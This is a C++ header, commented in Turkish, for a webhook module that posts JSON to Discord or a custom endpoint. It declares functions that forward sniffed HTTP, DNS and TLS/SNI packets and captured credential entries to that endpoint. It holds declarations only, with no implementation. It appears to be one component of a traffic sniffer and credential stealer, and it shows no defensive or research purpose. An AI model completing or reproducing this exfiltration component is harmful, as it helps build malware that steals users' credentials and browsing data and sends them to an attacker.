#pragma once
#include "parser.hpp"
#include "tls_sniffer.hpp"
#include "credential.hpp"
#include <string>

// ============================================================
//  webhook.hpp — Webhook gönderim modülü
//  Discord veya özel endpoint'e JSON POST atar
// ============================================================

namespace Webhook {

    // Webhook'u başlat (WinINet init)
    void Init();

    // Webhook'u kapat
    void Cleanup();

    // HTTP paket verisini webhook'a gönder
    bool SendHTTP(const Parser::HTTPPacket& pkt);

    // DNS sorgu verisini webhook'a gönder
    bool SendDNS(const Parser::DNSPacket& pkt);

    // TLS/SNI paket verisini webhook'a gönder
    bool SendTLS(const TLSSniffer::TLSPacket& pkt);

    // Credential verisini webhook'a gönder
    bool SendCredential(const Credential::CredEntry& cred);

    // Ham JSON string'i webhook URL'ine POST et
    // URL boşsa false döner (webhook devre dışı)
    bool PostJSON(const std::string& json_body);

    // JSON escape (özel karakterleri kaçır)
    std::string JsonEscape(const std::string& s);

    // Webhook aktif mi?
    bool IsEnabled();
}
